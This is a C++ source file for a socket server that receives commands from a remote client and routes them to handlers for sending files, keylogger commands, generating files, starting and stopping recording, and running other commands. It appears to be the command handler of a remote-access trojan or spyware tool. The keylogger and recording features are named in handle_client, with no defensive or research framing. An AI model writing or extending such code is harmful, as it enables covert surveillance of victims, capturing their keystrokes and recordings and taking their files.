#include "serverHandler.h"
#include "commandProcessor.h"
#include "Application/executeCommand.h"
#include "socketFiles.h"

void configure_socket_for_large_files(SOCKET clientSocket) {
    int sendBufSize = 8 * 1024 * 1024; // 8MB send buffer
    int recvBufSize = 8 * 1024 * 1024; // 8MB receive buffer
    int timeout = 600000;              // 10 minutes timeout
    int keepAlive = 1;                 // Enable keep-alive
    int noDelay = 1;                   // Disable Nagle algorithm

    setsockopt(clientSocket, SOL_SOCKET, SO_SNDBUF, (char*)&sendBufSize, sizeof(sendBufSize));
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVBUF, (char*)&recvBufSize, sizeof(recvBufSize));
    setsockopt(clientSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(clientSocket, SOL_SOCKET, SO_KEEPALIVE, (char*)&keepAlive, sizeof(keepAlive));
    setsockopt(clientSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&noDelay, sizeof(noDelay));

    std::cout << "[Config] Socket configured for large file transfer" << std::endl;
}

std::string receive_command(SOCKET sock) {
    char buffer[4096] = {};
    int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);

    if (bytes <= 0) return "";

    buffer[bytes] = '\0';
    return std::string(buffer);
}

std::string trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \r\n\t");
    if (a == std::string::npos) return "";
    size_t b = s.find_last_not_of(" \r\n\t");
    return s.substr(a, b - a + 1);
}

void send_error_response(SOCKET clientSocket, const std::string& message) {
    std::cout << "[Error] " << message << std::endl;
    size_t fileSize = 0;
    send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);
}

void send_success_response(SOCKET clientSocket, const std::string& message) {
    std::cout << "[Success] " << message << std::endl;
    size_t msgSize = message.length();
    send(clientSocket, reinterpret_cast<const char*>(&msgSize), sizeof(msgSize), 0);
    send(clientSocket, message.c_str(), static_cast<int>(msgSize), 0);
}

void handle_client(SOCKET clientSocket) {
    std::cout << "[Connection] Client connected" << std::endl;

    configure_socket_for_large_files(clientSocket);

    try {
        std::string message = receive_command(clientSocket);
        if (message.empty()) {
            std::cout << "[Warning] Empty message received" << std::endl;
            closesocket(clientSocket);
            return;
        }

        std::istringstream iss(message);
        std::string command;
        std::getline(iss, command);

        command = trim(command);

        std::cout << "[Server] Processing command: " << command << std::endl;

        // Route command to appropriate processor
        if (command.find("send_file") == 0) {
            process_send_file_command(clientSocket, command);
        }
        else if (is_keylogger_command(command)) {
            process_keylogger_command(clientSocket, command);
        }
        else if (is_file_generating_command(command)) {
            process_file_command(clientSocket, command);
        }
        else if (command == "start_recording" || command == "stop_recording") {
            process_recording_command(clientSocket, command);
        }
        else if (is_simple_or_parameterized_command(command)) {
            process_simple_command(clientSocket, command);
        }
        else {
            send_error_response(clientSocket, "Unknown command: " + command);
        }
    }
    catch (const std::exception& e) {
        std::cout << "[Error] Exception: " << e.what() << std::endl;
    }

    closesocket(clientSocket);
    //std::cout << "[Disconnect] Client disconnected" << std::endl;
}